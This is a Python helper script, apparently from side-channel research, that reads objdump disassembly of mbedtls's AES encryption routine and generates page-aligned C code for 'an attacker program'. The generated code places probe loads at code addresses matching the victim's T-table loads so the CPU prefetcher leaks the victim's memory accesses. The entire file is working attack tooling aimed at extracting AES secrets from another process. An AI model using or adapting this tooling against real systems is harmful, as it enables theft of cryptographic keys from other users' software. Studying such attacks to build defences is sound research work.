#!/usr/bin/env python3
# This script generates aligned code. To exploit the prefetcher
# successfully, it is necessary to load values from memory using a load
# instruction that is placed at a specific code address -- usually a code
# address matching another load instruction in a victim program.

# This script works as follows:
#   ___________             _______________             __________________
#   |_objdump_| --stdin-->  |_this script_| --stdout--> |_aligned c code_|

# Pipe the output of
#   objdump --disassemble=mbedtls_internal_aes_encrypt libmbedcrypto.so
# into this script, it will generate aligned C code that can be included in
# an attacker program. Note that the produced code uses
# __attribute__((aligned(4096))) on functions, which may not be supported
# by some compilers. I used clang. 

import json
import sys
import abc
import os
import re

class Position(dict):
    def __init__(self, label, position):
        dict.__init__(self, label=label, position=position & 0xfff)

class Function(metaclass=abc.ABCMeta):
    def __init__(self, return_type, name, parameters=[]):
        self.return_type = return_type
        self.name = name
        self.parameters = parameters
    
    def generate_signature(self):
        result = f"{self.return_type} {self.name}("
        for p in self.parameters:
            result += f"{p[0]} {p[1]}, "
        if len(self.parameters) > 0:
            result = result[:-2]
        else:
            result += "void"
        result += ")"
        return result

    def line(self, indent, line):
        return "\t" * indent + line + "\n"

    def generate(self, base_indent=0):
        result =  self.line(base_indent, self.generate_signature() + " {")
        result += self.generate_body(base_indent + 1)
        result += self.line(base_indent, "}")
        return result

    @abc.abstractmethod
    def generate_body(self):
        pass

    def __repr__(self):
        return self.generate_signature()

class PaddingFunction(Function):
    def __init__(self, padding_name, padding_bytes, page_aligned=False):
        super().__init__("void", f"padding_{padding_name}")
        self.padding_bytes = padding_bytes
        self.page_aligned = page_aligned

    def generate_body(self, body_indent):
        # each instruction has length 4 --> divide by 4
        # there will be an additional mandatory ret instruction --> minus 1
        padding = int(self.padding_bytes / 4) - 1
        current_power_of_2 = 1
        result = ""
        while padding > 0:
            if padding & 1 != 0:
                result += self.line(body_indent, f"NOP{current_power_of_2}")
            padding >>= 1
            current_power_of_2 <<= 1
        return result

    def generate_signature(self):
        result = super().generate_signature()
        if self.page_aligned:
            result += " __attribute__((aligned(4096)))"
        result += f" /* ({self.padding_bytes}B) */"
        return result

class AccessFunction(Function):
    length_bytes = 15 * 4
    ldr_offset = 7 * 4

    def __init__(self, pos_name):
        super().__init__("void", f"access_{pos_name}", [("uint8_t*", "ptr_access")])
    
    def generate_body(self, body_indent):
        result =  self.line(body_indent, "maccess(ptr_access);")
        result += self.line(body_indent, "mfence();")
        result += self.line(body_indent, "cache_query();")
        return result

def next_index(target_positions, current_index, current_position):
    # special case for first iteration
    if current_index == -1:
        return 0

    min_next_ldr = (current_position + AccessFunction.ldr_offset)

    # if possible, select the element that is
    #  a) closest and
    #  b) at least AccessFunction.ldr_offset away
    i = 0
    best_dist_idx = (8192, 0)
    while i < len(target_positions):
        candidate_index = (current_index + i) % len(target_positions)
        candidate_position = target_positions[candidate_index]["position"]
        while candidate_position < min_next_ldr:
            candidate_position += 0x1000
        candidate_dist = candidate_position - current_position
        if candidate_dist < best_dist_idx[0]:
            best_dist_idx = (candidate_dist, candidate_index)
        i += 1
    return best_dist_idx[1]

###########################################################################

if __name__ == '__main__':
    # ensure that something was piped into the program
    if os.isatty(sys.stdin.fileno()):
        print("Please pipe the output of\n    objdump --disassemble=mbedtls_internal_aes_encrypt libmbedcrypto.so\ninto this program.")
        sys.exit(1)

    # read stdin
    with sys.stdin as stdin_file:
        assembly_code = stdin_file.read()

    # find the relevant code lines and extract their addresses
    code_addrs = []
    for line in assembly_code.splitlines():
        if len(code_addrs) == 16:
            break
        rx = re.match(r"^\s+([0-9a-f]+):\s+[0-9a-f]+\s+ldr\s+.*uxtw.*$", line)
        if rx:
            code_addr = int(rx.group(1), 16)
            code_addrs.append(code_addr)

    assert(len(code_addrs) == 16)

    # compute relevant code addresses (and print them to stderr)
    target_positions = []
    for FT_access_no in range(4):
        for FT_no in range(4):
            pos_name = f"FT{FT_no}_{FT_access_no}"
            pos_addr = code_addrs[FT_access_no*4+FT_no]
            print(f"Position(\"{pos_name}\", {pos_addr:x})", file=sys.stderr)
            target_positions.append(
                Position(pos_name, pos_addr)
            )

    # target_positions = [
    #     Position("FT0_0", 0x11a4bc),
    #     Position("FT1_0", 0x11a4c4),
    #     Position("FT2_0", 0x11a4cc),
    #     Position("FT3_0", 0x11a4d0),
    #     Position("FT0_1", 0x11a4f0),
    #     Position("FT1_1", 0x11a4fc),
    #     Position("FT2_1", 0x11a504),
    #     Position("FT3_1", 0x11a508),
    #     Position("FT0_2", 0x11a528),
    #     Position("FT1_2", 0x11a534),
    #     Position("FT2_2", 0x11a538),
    #     Position("FT3_2", 0x11a550),
    #     Position("FT0_3", 0x11a554),
    #     Position("FT1_3", 0x11a55c),
    #     Position("FT2_3", 0x11a570),
    #     Position("FT3_3", 0x11a578),
    # ]

    target_positions.sort(key=lambda x: x["position"])

    functions = []
    current_position = 0
    current_index = -1
    while len(target_positions) > 0:
        current_index = next_index(target_positions, current_index, current_position)
        current_target = target_positions.pop(current_index)
        current_target_position = current_target["position"]
        while current_target_position < (current_position + AccessFunction.ldr_offset):
            current_target_position += 4096

        # add padding from current position to start of access function
        padding = current_target_position - current_position - AccessFunction.ldr_offset
        if padding > 0:
            functions.append(PaddingFunction(current_target["label"], padding))
        functions.append(AccessFunction(current_target["label"]))
        current_position += padding + AccessFunction.length_bytes

    # set first padding function page aligned
    for function in functions:
        if isinstance(function, PaddingFunction):
            function.page_aligned = True
            break

    for function in functions:
        print(function.generate())